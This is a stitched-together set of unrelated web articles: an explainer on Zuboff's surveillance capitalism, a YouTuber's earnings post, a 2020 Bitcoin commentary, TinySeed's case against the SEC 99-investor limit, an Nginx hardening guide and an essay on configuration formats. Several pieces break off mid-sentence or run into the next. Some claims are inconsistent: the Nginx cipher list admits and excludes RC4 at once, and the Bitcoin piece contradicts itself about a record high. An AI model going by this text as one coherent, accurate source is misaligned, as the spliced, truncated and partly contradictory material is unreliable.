<p><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Gecko">Gecko</a> - the browser engine powering Firefox, developed by Mozilla. It also implements WebGPU via <em>wgpu</em>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The concept of surveillance capitalism is an important one in helping us to better understand our relationship with big technology companies like Google and Facebook. But although its explanatory power has an allure for many people, it’s important to explore what surveillance capitalism is in more depth.</p><p>This is because the genealogy of the concept and the way in which different people have explained and defined it – most significantly Harvard Professor Shoshana Zuboff – has serious implications for how we understand ‘big tech’ and the problems it is causing. More importantly, it could also help us identify what we need to do to solve them.</p><h2>What is surveillance capitalism?</h2><p>Surveillance capitalism is an idea that has been developed to explain how technology companies such as Facebook, Google, and Amazon are able to successfully monetize the information and data they collect about us.</p><p>This is ‘surveillance’ insofar as the data that they collect lets them ‘watch’ users on their platforms. It allows them to build a picture of our preferences and our behaviours. The ability to build up this picture gives them a significant commercial advantage, and significant power within the digital ecosystem. It doesn’t allow them to sell products – it makes them a critical part of the infrastructure of the digital economy.</p><p>The means through which this surveillance can take place is constantly evolving. Think, for example of Amazon Alexa and Google Home. Such products allow big tech to gather data on our everyday lives even when we are away from our screens. This allows them to better understand these domains, and they will likely eventually find a way to exploit them commercially.</p><h2>When did surveillance capitalism begin?</h2><p>In historical terms, surveillance capitalism aligns with the growth of the internet. More specifically, however, it was the emergence of <a href="https://en.wikipedia.org/wiki/Web_2.0">Web 2.0</a>.</p><p>The dominance of platforms like Facebook and Google is an important characteristic of Web 2.0. Rather than enabling passive information consumption, Web 2.0 facilitates active engagement, whether that’s between people or between people and companies. Because activity is a key element of web 2.0, this means not only is more data produced, it’s also much richer as well. It is able to capture more complex relationships within a given network.</p><p>The story could be put like this: as the world became more digitized throughout the 2010s, with consumers both more comfortable with digital life and better digitally connected than ever before (think, for example, of the number of devices used in daily life), the huge amounts of data that such an environment produced became a useful commodity for the companies whose platforms were such an integral part of this digital ecosystem.</p><h3>Digital advertising</h3><p>It’s hard to separate surveillance capitalism from digital advertising. Facebook and Google, for example, are fundamentally advertising platforms. What makes them particularly effective is that they have huge amounts of data that makes them exceptionally good at targeting advertising and other types of messages to very specific groups of people.</p><p>Many people forget this but it’s important: these companies don’t sell to consumers, they sell to organizations that sell to consumers. This is where the idea that ‘if it’s free, you are the product’ comes from. Companies like Facebook and Google are selling access to users – you – to other businesses and organizations.</p><h2>Why are we talking about surveillance capitalism now?</h2><p>The business models of large technology platforms didn’t emerge in the last couple of years. They were in place more than a decade ago; they have simply evolved to become increasingly more powerful and pervasive. You might even say that there has been a lag between the <em>embrace</em> of digital technologies and the awareness that they might be problematic.</p><p>But where has this awareness come from? What’s changed? Well, there are a couple of important things throughout the last decade that have given a different complexion to the tech industry.</p><p>First, <a href="https://www.informationisbeautiful.net/visualizations/worlds-biggest-data-breaches-hacks/">high profile data leaks</a> have made people more aware of the ways in which their data is vulnerable online. This issue doesn’t strictly relate to the concept of surveillance capitalism but it has nevertheless been an important subplot in the narrative of digitization. It has encouraged many people to question the assumption that the digital revolution is unequivocally good.</p><p><strong>Read next: <a href="https://thecookiemag.com/what-is-the-techlash-really-and-is-it-actually-over/">What is the techlash?</a></strong></p><h3>The Cambridge Analytica scandal</h3><p>Second – and more significant – was the Cambridge Analytica scandal. Although Cambridge Analytica wasn’t <a href="https://www.theguardian.com/technology/2019/mar/17/the-cambridge-analytica-scandal-changed-the-world-but-it-didnt-change-facebook">really doing anything radically different from any other digital marketing company</a>, the fact that it appeared to be working with political actors that wanted to ‘manipulate’ citizens in some way added a new dimension to the public’s perspective on this actually rather mundane reality of the digital economy.</p><p>It’s in this context of confusion and cynicism about the way that actors are using platforms that the most popular account of surveillance capitalism was given by Shoshana Zuboff. Her book The Age of Surveillance Capitalism was published in 2019. Its success indicates that the has been looking for a way of explaining something so perplexing and complex yet significant.</p><p><strong>Read more in our <a href="https://thecookiemag.com/tag/explained/">Explained</a> series, featuring explainers about key ideas and issues in technology.</strong></p><h2>Shoshana Zuboff’s definition of surveillance capitalism</h2><p>Zuboff’s definition of surveillance capitalism doesn’t rest simply on the collection of data. Instead, she asserts that surveillance capitalism is unique because of the way in which it uses data to modify and manipulate behaviour. “When a firm collects behavioral data with permission and solely as a means to product or service improvement” she writes, “it is committing capitalism but not surveillance capitalism.”</p><p>To emphasise this point, she develops a concept she terms ‘behavioral surplus.’ This is, Zuboff tells us, data drawn from a domain beyond a product or service. Surveillance capitalism, Zuboff explains, “unilaterally claims human experience as free raw material for translation into behavioural data” – it turns supposedly non-digital aspects of life into this ‘behavioral surplus’.</p><p>This ‘behavioral surplus’ powers growth. It helps tech companies to modify human behaviours in a way that is commercially useful. Think for example, of the way Google Home products turn domestic life into a vast treasure trove of data for the company.</p><p>Zuboff contrasts the drive to extract behavioural surplus with something she calls the ‘behavioral value reinvestment cycle’. It sounds complicated, but it’s really just a feedback loop. For Zuboff it’s a consumer-friendly way of using data to improve the customer’s experience of a product or service.</p><h3>Advocacy-oriented capitalism</h3><p>‘Behavioural value reinvestment’ is something done by a different type of capitalism. This is what Zuboff calls ‘advocacy-oriented capitalism’. In Zuboff’s narrative of the evolution of capitalism, this is the hero at our current historical and economic juncture: it represents the forces of good, while surveillance capitalism is decidedly evil.</p><p>As the name suggests, advocacy-oriented capitalism is exemplified by companies that leverage the possibilities of the digital revolution to ‘empower’ consumers. Zuboff explains this in more depth by describing surveillance capitalism as “instrumentarian.” This means it is geared towards the modification of behaviour in a way that establishes certainty and predictability that is commercially beneficial. Advocacy oriented capitalism, meanwhile, is far more democratic – it uses data to better respond to consumer needs and demands, not to shape and determine those needs.</p><h3>An aberration of capitalism</h3><p>So, for Zuboff, surveillance capitalism is an aberration or <em>mutation</em> of capitalism.</p><p>In a contemporary context it differs from advocacy oriented capitalism in the way that it attempts to colonize and commodify human experience in order to manipulate and shape it. In a historical context, meanwhile, Zuboff argues that it differs from industrial capitalism because it undermines the “institutionalized reciprocity” that was part and parcel of the Fordist era.</p><p>To put it another way, the age of industrial mass production ensured both stable profits for capitalists, stable employment for workers, and affordable products for consumers.</p><p>Essentially, surveillance capitalism doesn’t find success by responding to the needs and demands of customers like other forms of capitalism. It finds success by manipulating them.</p><h2>Criticism of Zuboff</h2><p>Zuboff’s argument that surveillance capitalism is an aberration of capitalism has come in for significant criticism. Perhaps the best critique of her book comes from <a href="https://thebaffler.com/latest/capitalisms-new-clothes-morozov">Evgeny Morozov in The Baffler</a>.</p><p>Over the course of more than 10,000 words, Morozov takes Zuboff to task for failing to properly interrogate the assumptions on which her conception of surveillance capitalism rests. Zuboff, Morozov writes, “outlines what she believes to be a unique phenomenon, describing it in depth, but without building any bridges (if only to burn them) to the alternative conceptions of that same phenomenon.”</p><p>To put it another way, Zuboff fails to be rigorous in her construction of the concept. By isolating it, she naturalizes it. In turn, this allows it to be used as a validating framework for her implicit theory about the evolution of capitalism.</p><h3>The consumer</h3><p>There’s a lot to cover if you want to properly engage with Morozov’s review. However, the one of the key takeaways from Morozov is that Zuboff is in thrall to the idea of ‘the consumer’ as a sovereign, power from which capitalism takes its cue.</p><p>This is something discussed above. In Zuboff’s view, ‘normal’ capitalism is when consumer demand is met and satisfied effectively. Surveillance capitalism is when the consumer is manipulated and exploited through the extraction of their ‘behavioral surplus’.</p><p>The problems with such an argument are easy to spot. For example, the idea that ‘normal’ …</p></div></div>

<p>Earnings on YouTube, everyone knows that it is different for each particular niche and it is based on how many views you get.</p>
<p>A few years back, I was extremely curious as to how much a youtuber can earn at different levels of the “journey”, more specifically, at the beginning.</p>
<p>Here is <strong>exactly how much I earned</strong> on youtube from the moment I got accepted into the adsense program until now💰.</p>

</p></figure>
<p><strong>I started my channel</strong> a while back, when I first released my <a href="https://youtu.be/4q9CNtwdawA">Web Scraping with Puppeteer</a> video back in <strong>November 2018</strong>, which is still valuable and still brings good views even now. </p>
<p>I created those initial videos that you find on my channel for the sole purpose of delivering good quality content and to help people with <a href="https://learnscraping.com/">Scraping with NodeJs</a>, as I also released my first ever Udemy course around the same time to bring some extra traffic and potential sales to it.</p>
<h2><span id="Beginning_to_now"></span>Beginning to now<span></span></h2>
<p>Here are the exact statistics of my “beginner” youtube account, I have under 2,000 subscribers and just got monetized a few months ago 🎉.</p>
<figure><img loading="lazy" width="1024" height="619" src="https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-1024x619.png" alt="" srcset="https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-1024x619.png 1024w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-300x181.png 300w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-768x464.png 768w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-1536x929.png 1536w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-2048x1238.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>Here are some quick stats that you can also see in the dashboard</p>
<ul><li>My first 4 videos barely got any traction on youtube.</li></ul>
<ul><li>The 5th and 6th videos got viral and were featured on Reddit and newsletters.</li></ul>
<ul><li>I took long breaks, I never was serious about being a YouTuber (though I always liked the idea).</li></ul>
<ul><li>I got monetized on the 1st of September, 2020.</li></ul>
<h2><span id="I_made_$53_in_2_months_and_a_half"></span>I made $53 in 2 months and a half<span></span></h2>

<p>Without any extra work from my side, simply by enabling the Ads on my account, I had made $53.</p>
<p>Now, what do I make of this?</p>
<p>I am honestly impressed by how much you can earn with just a few normal videos in this niche. I can definitely see how this can be transformed into an actual money making business that allows you to live comfortably.</p>
<p>I have learned that if you put enough work and dedication into your craft, the results will come. This can be also applied to creating videos and being a youtuber.</p>
<h2><span id="Top_earning_videos"></span>Top earning videos<span></span></h2>
<p>I think this is an important topic to talk about as if you are paying attention, it shows you a lot about people and how it all works.</p>

<ul><li><strong>Web Scraping with Puppeteer in 10 minutes</strong> (42,000+ views) – has a very catchy title and it actually delivers good and quality content in a short amount of time.</li></ul>
<ul><li><strong><a href="https://youtu.be/kOaP5qI0N1M">How much I earned with my first course on Udemy</a></strong> (3,500+ views) – this is a known one, people are interested in money and how much you can make by being a YouTuber or any other niche. </li></ul>
<ul><li><strong>Building an Instagram Like Bot</strong> (32,000+ views) – this video would’ve made much more if it would’ve been monetized back when it was released as it was a trendy subject back in 2018.</li></ul>
<h2><span id="Conclusion"></span>Conclusion<span></span></h2>
<p>I hope these statistics have satisfied your curiosity on how much you can earn on youtube while having under 2,000 subscribers.</p>

<p>Bitcoin is at full bull-mode since the March 2020 crash. Currently, it is pumping non-stop without significant correction (20-30% correction is very normal in a bull market.) Bitcoin has even broken an all-high time record since its decline in January 2018 from $20k. Last time when it went above $20k it could not hold for much longer and crashed shortly after.</p>
<p>Will it do the same now that it has reached the $17k mark? Let’s take a look at the factors causing it upward direction.</p>
<h2>Institutional Adoption</h2>
<p>Institutional adoption is growing fast and several companies like <a href="https://fortune.com/2020/08/11/buying-bitcoin-microstrategy-cryptocurrenc/">Microstrategy</a>&nbsp;and <a href="https://www.cnbc.com/2020/10/08/square-buys-50-million-in-bitcoin-says-cryptocurrency-aligns-with-companys-purpose.html">Square</a> has already bought Bitcoin as a hedge against Fiat. Despite its business connections, Bitcoin is still not as talked about as the 2017 craze, according to Google Trend’s retail interest.</p>
<p>It may take more of a public adoption in order to hold its ATH (all-time high) this time around.</p>
<h2>Technical Analysis</h2>
<p>Now let’s get technical. Here are a few trends that make BTC look stable.</p>
<ul>
<li>BTC/USD pair is currently in range bound and this can be a signal of a strong uptrend.</li>
<li>Bitcoin price is trading above a 21-Day WEMA (Weighted Estimated Moving Average)</li>
<li>The RSI (relative strength index) is at 50</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e7b2ccadd106c01a49f9"><div><h3>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>, <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</h3><p>At TinySeed, we are in the process of <a href="https://tinyseed.com/latest/invest">raising the second fund</a> for our SaaS accelerator, and we’re often asked why we have such a high minimum investment. If an <a href="https://www.investopedia.com/terms/a/accreditedinvestor.asp">accredited investor</a> wants to put in $50,000, why would we turn them down?&nbsp;</p><p>It all comes down to SEC regulations, which limit funds like ours to a maximum of 99 accredited investors. In order to raise the amount of capital required to execute on <a href="https://tinyseed.com/thesis">our investment thesis</a>, we must enforce a (relatively) high minimum investment.&nbsp;</p><p>We didn’t write this article to complain about our situation, as <a href="https://tinyseed.com/invest">fundraising (even with this minimum in place) is going quite well</a>. But for us, this process has brought to light an unintended consequence of this 99 investor limit.</p><p>Over time, successful venture firms raise larger and larger funds, quickly running into the 99 investor limit, and forcing their investment minimum higher. <strong>These high minimums concentrate this wealth creation opportunity to super high net worth individuals and institutional investors, excluding accredited investors who cannot afford to write such a large check.</strong></p><p>The SEC enforces certain kinds of regulations to provide investor protections against fraud and abuse, which we salute. However, current regulations (and this 99 investor limit) prohibit the average accredited investor from accessing these markets in a meaningful way. This matters because the private markets are a significant driver of wealth creation.</p><p>We fully understand that the SEC needs to have some limit on the number of investors that can invest in a private fund. <strong>However, we believe that the current limit of 99 is the wrong approach.&nbsp;</strong></p><p>We started TinySeed because we wanted to give founders more options for capital to grow their companies, and we feel that as a fund, we can and should also call for change in how sophisticated investors are able to invest their money.<strong><em> </em></strong>Specifically, we believe that successful tech founders and operators should be able to invest into the field they understand best — early stage technology — instead of being limited to real estate or the public markets.</p><p>We believe funds like ours should be able admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are accredited.</p><h3>As the current rules are enshrined in law, we’re exploring ways to bring this issue in front of Congress. <strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem">Share on LinkedIn</a></p></li></ul><p>Fund regulations and SEC rules are fairly complicated; read on for our breakdown of what everything means below:<br></p><h2>Current SEC regulatory regime for private funds</h2><h3>3(c)(1) vs. 3(c)(7)</h3><p>The SEC’s regulatory regime currently provides 2 exemptions to the (burdensome and expensive) requirement for a venture fund like ours to be registered with the SEC: 3(c)(1) and 3(c)(7).</p><p>A 3(c)(1) fund may have no more than 99 Accredited Investors, while a 3(c)(7) fund can have up to 1999 investors, but these must all be “Qualified Purchasers”. The qualified purchaser, or QP, definition is a significant increase in the required net worth compared to accredited investors.</p><h3>Why can’t investors pool their money and create a single entity to invest?</h3><p>The SEC stipulates that accredited investors cannot pool their money and create a single entity (for example through an SPV) to invest in the fund – the SEC will “look through” this entity and count the number of investors there as long as the entity was created for the purpose of making a specific investment.&nbsp;</p><h3>Why can’t we create parallel funds?</h3><p>Another often suggested option, to run several parallel funds that co-invest, is also forbidden, as the SEC will count as a single fund, any set of funds that a reasonable investor would deem to be identical.</p><h3>One burdensome option: The “QP sleeve”</h3><p>The only exception to the above is what’s sometimes referred to as a “QP sleeve”. A 3(c)(1) fund may operate in parallel with a separate 3(c)(7) fund. This does add significant overheads, but frees up some slots for accredited investors by moving the qualified purchasers into the 3(c)(7) (of which there can be 1999).</p><h3>The recent JOBS act</h3><p>A more recent change was introduced with the JOBS act, which expanded the ability of fund managers to promote their offerings publicly, with the trade-off that doing so would tighten the requirement to verify that all investors were in fact accredited investors (a 506c offering). We think these changes are laudable, as they increase awareness of specific offerings among accredited investors while also adding further, appropriate, protections.</p><h2>Recent regulatory efforts to expand investment opportunities, harmonize regulations with other jurisdictions and further capital formation</h2><p>&nbsp;The SEC very recently issued updated accredited investor definitions: </p><blockquote><p>For the first time, individuals will be permitted to participate in our private capital markets not only based on their income or net worth, but also based on established, <strong><em>clear measures of financial sophistication</em></strong>.</p></blockquote><p>(Emphasis ours.)</p><p>We salute this change, and even though we think the SEC has further to go in terms of widening the definition of accredited investors, it’s a great first step. This change is well inline with the SECs ongoing efforts to “simplify, harmonize, and improve the exempt offering framework, thereby expanding investment opportunities while maintaining appropriate investor protections and promoting capital formation.”</p><p><strong>&nbsp;However, we believe that the current limit of 99 accredited investors per 3(c)(1) fund runs counter to these efforts.</strong></p><h2>The many downsides of the 99 accredited investor limit</h2><p>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>,&nbsp; <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</p><ul data-rte-list="default"><li><p>A fund manager can accept smaller checks from wealthier individuals, as the higher QP limit in the sleeve means that there is effectively no minimum amount required of those individuals. </p></li><li><p>Conversely, and perversely, a fund manager looking to raise a more substantial fund is forced to ask for larger checks from the less wealthy investor, or keep that investor out of the fund entirely.</p></li></ul><p><strong>This is far from ideal and, in our experience, excludes sophisticated investors from being allowed to invest in funds like ours. </strong>In some cases these excluded investors have a deep understanding of the industry being invested into, and perhaps with atypical backgrounds as far as fund investors go. <strong>We do not believe those kinds of investors should be effectively excluded from making these kinds of investments.</strong></p><p>Instead what happens is that as funds grow from very small (sub $10m) they are forced to seek capital from larger, institutional investors like Fund of Funds, Endowments and various Family Offices.</p><p><strong>While these more institutional LPs are a fine source of capital, it’s undoubtedly true that they are more risk averse and in general prone to relying on a proven track record for the managers they back.&nbsp;</strong></p><p>A great example of this is the University of Texas’ (laudable) Emerging Managers Program. This is a program setup explicitly to support new (aka emerging) managers, though the criteria for selection includes:</p><ul data-rte-list="default"><li><p>Attributable track record within target strategy</p></li><li><p>Investment teams with history of working together</p></li><li><p>Principals known in the investment community and are positively referenceable</p></li></ul><p><strong>Clearly, such terms favor managers that “emerge” from existing funds.</strong> This means that the type of general partners that more easily get backing from these kinds of investors are of the same mold as GPs that already exist.<strong> New and diverse GPs with novel ways to invest are effectively locked into staying small or violating SEC rules.</strong></p><h2>Proposed solution: <br><strong>Allow as many Accredited Investors as Qualified Purchasers.</strong></h2><p>The oversight of private funds is light by definition, so we fully understand why the SEC imposes a limit on the number of investors. Without a limit, a fraudulent fund could become a significant issue if tens or hundreds of thousands of investors could invest.&nbsp;</p><p><strong>However, we feel the unintended consequences of concentrating wealth creation to only super high net worth individuals or institutional investors with the 99 Accredited Investors limit is not the right trade-off in this regard.</strong> We propose that private funds relying on the 3(c)(1) exemption should be allowed to admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are in fact accredited (something that is already a requirement for a 506c offering.)</p><h3><strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20" target="_blank">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on LinkedIn</a></p></li></ul></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Nginx is a lightweight, open-source, robust, high-performance HTTP server and a reverse proxy. It’s the most popular web server, beating Apache and IIS.</p><p>Nginx is recognized for its stability, performance, rich feature set, easy configuration, and low resource consumption.</p><p>While the default configurations are favoured by most people, they are not secure enough, and extra tweaks are needed to reinforce the web server.</p><p>Here, we will look into some actions you can take to strengthen and improve Nginx server security.</p><h2 id="disable-any-unwanted-modules">Disable Any Unwanted Modules</h2><p>While installing Nginx, in default it includes many modules. Currently, we cannot choose modules at runtime. To disable specific modules, you need to recompile Nginx.</p><p>It is advised to disable any modules that are not used as this will decrease the risk of potential attacks by limiting operations.</p><h2 id="implement-ssl-certificate">Implement SSL Certificate</h2><p>The primary and essential step in strengthening your Nginx server security is to include an additional layer of protection using an SSL certificate.</p><p>The SSL certificate is a digital certificate powered by cryptography that encrypts data traffic between your web server and the web browser. SSL certificate also forces your website to use the secure HTTPS protocol over HTTP, which transmits traffic in plain text.</p><p>You can make use of Let’s Encrypt SSL which is free or any certificate according to your preference. There are two additional settings that should be taken care of after you implement a SSL certificate.</p><h3 id="disable-weak-ssltls-protocols">Disable weak SSL/TLS protocols</h3><p>Implementing SSL does not imply that your site is secure. Deprecated versions of SSL such as TLS 1.0, TLS 1.1 are identified as weak, and these protocols are inclined to <a href="https://beaglesecurity.com/blog/article/importance-of-tls-1-3-ssl-and-tls-vulnerabilities.html">SSL and TLS vulnerabilities</a> such as POODLE, BEAST, and CRIME.</p><p>The most commonly used web browsers like Chrome, Firefox, Safari and Edge no longer support TLS 1.0 and TLS 1.1.</p><p>To implement TLS 1.2 and TLS 1.3, we have to edit two configuration files:</p><ul><li><p>/etc/nginx/nginx.conf</p></li><li><p>/etc/nginx/sites-available/default</p></li></ul><p>Locate the following line in <strong><em>nginx.conf</em></strong> file</p><div><figure><pre><code data-lang="shell">       ssl_protocols TLSv1 TLSv1.1 TLSv1.2<span>;</span> <span># Dropping SSLv3, ref: POODLE</span>

   </code></pre></figure></div><p>And, remove TLS versions 1 and 1.1 and add TLS 1.3</p><div><figure><pre><code data-lang="shell">        ssl_protocols TLSv1.2 TLSv1.3<span>;</span> <span># Dropping SSLv3, ref: POODLE</span>

   </code></pre></figure></div><p>However, obsolete protocols also may be present in your Nginx server block configuration files. The block configuration files are in the directory <strong><em>/etc/nginx/sites-available/</em></strong>.</p><p>Therefore, continue and change your block configuration file as before.</p><p>Find the following line</p><div><figure><pre><code data-lang="shell">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2<span>;</span>

   </code></pre></figure></div><p>As before, delete the TLSv1 and TLSv1.1 protocol and add the TLSv1.3.</p><div><figure><pre><code data-lang="shell">        ssl_protocols TLSv1.2 TLSv1.3<span>;</span>

   </code></pre></figure></div><h3 id="disable-weak-cipher-suites">Disable weak cipher suites</h3><p>Weak cipher suites may lead to vulnerabilities, and as a secure practice, we must make sure that only strong ciphers are allowed.</p><p>Add the following to the server block in the <strong><em>ssl.conf</em></strong> file</p><div><figure><pre><code data-lang="shell">        ssl_ciphers <span>"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA HIGH !RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS"</span><span>;</span>

   </code></pre></figure></div><p>The default state of a Nginx server returns something like Server: nginx/1.12.1 in the server response or error pages. The best method is to remove the header completely. For that, we require the installation of <strong><em>nginx-extras</em></strong>.</p><p>For Debian/Ubuntu</p><div><figure><pre><code data-lang="shell">        <span>sudo </span>apt-get <span>install </span>nginx-extras

    yum <span>install </span>nginx-plus-module-headers-more

   </code></pre></figure></div><p>After installing and restarting the Nginx service, add the following lines to your <strong><em>nginx.conf</em></strong> file.</p><div><figure><pre><code data-lang="shell"> 
        <span># /etc/nginx/nginx.conf</span>
        http <span>{</span>

            more_set_headers <span>'Server: '</span><span>;</span>

   </code></pre></figure></div><p>If no value is specified, the header will be displayed empty. We can also create custom headers as given below.</p><div><figure><pre><code data-lang="shell">

            more_set_headers <span>'Server: Custom Header'</span><span>;</span>

   </code></pre></figure></div><p>To completely disable the server header, find server_token in the Nginx configuration file and set it to server_tokens off (by removing # in the <strong><em>nginx.conf</em></strong> file).</p><p><img src="https://beaglesecurity.com/blog/images/resized/neginx.png-f159357/812x450.png" alt="neinx rename"></p><h2 id="resource-control">Resource Control</h2><p>To counter potential DoS attacks on Nginx it’s possible to set buffer size restrictions for all the clients.</p><p>These settings also prevent any potential buffer overflow attacks.</p><p>Adding the below lines to the <strong><em>nginx.conf</em></strong> file will prevent any such attack.</p><div><figure><pre><code data-lang="shell">        <span>##buffer policy</span>

        large_client_header_buffers 2 1k<span>;</span>
        <span>##end buffer policy</span>

   </code></pre></figure></div><h2 id="disable-unsafe-http-methods">Disable unsafe HTTP methods</h2><p>Another sound practice for hardening Nginx server is to disable unsafe HTTP methods. Most of the time, GET, HEAD &amp; POST methods are only used.

  <p>… the configuration determines the possible behavior of the machine.</p>

</blockquote>

<h2 id="what-is-configuration-and-why-does-it-matter-for-software">What is configuration and why does it matter for software?</h2>

<p>Let’s root our thinking on configuration in the etymology of the word:</p>

<blockquote>
  <p><strong>configure (.v)</strong></p>

  <p>late 14c. (implied in configured) “to form, dispose in a certain form,” from
Latin <em>configurare</em> “to fashion after a pattern,” from assimilated form of
<em>com</em> “with, together” (see <em>con-</em>) + <em>figurare</em> “to form, shape,” from
<em>figura</em> “a shape, form, figure” (from PIE root <em>*dheigh-</em> “to form, build”).</p>

  <p><cite><a href="https://www.etymonline.com/word/configure#etymonline_v_18185">etymonline</a></cite></p>
</blockquote>

<p>Configuration is essentially concerned with shaping and forming the things in
the world that are receptive to our dictates.</p>

<p>The software we use is composed of programs that impress their patterns into the
<a href="http://webapp1.dlib.indiana.edu/vwwp/view?docId=VAB7144&amp;chunk.id=d1e542&amp;brand=vwwp&amp;doc.view=0&amp;anchor.id=#VAB7144-003">rhythms of our life</a>. While open source software invites user-authors
to read and rewrite these programs at their source, configuration is an
interface that allows user-authors to change program behavior without needing to
rewrite and rebuild the programs. As such, it is the most accessible means for
people to alter the programmed patterns that form and transform their lives.
Questions around the user interface for program configuration pertain directly
to questions about the means and degrees of empowerment in the information age.</p>

<h2 id="in-view-of-informal-systems-vision">In view of Informal System’s vision</h2>

<p>We can articulate four elements in focus for our vision:</p>

<ol>
  <li><strong>open source ecosystems</strong></li>
  <li><strong>cooperative ownership and governance</strong></li>
  <li><strong>distributed organizations</strong></li>
  <li><strong>reliable distributed systems</strong></li>
</ol>

<p>Considering software configuration in terms of interfaces for empowerment, we
can draw clear connections between these elements and the concerns of
configuration.</p>

<p>Our commitment to <strong>open-source ecosystems</strong> is rooted in our agreement with the
core emancipatory agenda of the <a href="https://en.wikipedia.org/wiki/Free_software_movement">Free Software
Movement</a>, which seeks to protect and foster cooperation
by ensuring access to inspect, transform, and run the programs that coordinate
our interactions. Strictly speaking, configurability is orthogonal to
open-source development, since closed-source programs can be arbitrarily
configurable. But the extent to which we make our software susceptible to
intervention and redirection by the people who use it is intimately related to
the wider aims of <em>libre</em> software.</p>

<p>We are <a href="https://theanarchistlibrary.org/library/the-invisible-committe-to-our-friends#toc16">witnessing</a> the most outsized ambitions of the
<a href="https://en.wikipedia.org/wiki/Cybernetics">cyberneticists</a> become actualized and <a href="https://www.ted.com/talks/kevin_slavin_how_algorithms_shape_our_world">reshape our
world</a>. It is now clear that the control over
society and the development of civilization cannot be separated from control
over the programs that determine the courses of our movement, the networks of
our sociality, the flows of our capital, and the availability of our collective
knowledge. The struggle for <strong>cooperative ownership and governance</strong> cannot,
therefore, be separated from the struggle to configure the programs that shape
our reality.</p>

<p>As explained in the following, our preferred approach to configuration is via
plain text files. A principle motivator here is the ease with which plain text
configuration can become a shared interface for shaping <strong>distributed
organizations</strong>: simply checking in a config file to a git repo gives
distributed access and management for configuration of any shared programs that
read from the file.</p>

<p>Software configuration is just as relevant for distributed programs as it is for
any other piece of software. One of our main criteria in evaluating
configuration formats is how easy they make it to reason about and communicate
complex configurations. Reasonable configuration interfaces are even more
critical for <strong>reliable distributed systems</strong> than they are for monolithic,
centralized, synchronous programs, since the distributed nature of the systems
already guarantees a high threshold of complexity.</p>

<p>Choice of configuration file format is one small decision among the countless
decisions that go into designing and implementing software projects. But it is a
decision that sits at the intersection of Informal System’s core concerns, and
the impact of the decision have far reaching implications.</p>

<h2 id="configuration-files">Configuration files</h2>

<p>The following considerations are only concerned with formats of plain text
<a href="https://en.wikipedia.org/wiki/Configuration_file">configuration files</a>. There are interfaces for configuring
programs which are not based around editing text files and you’ve surely used
something similar to one of the following:</p>

<ul>
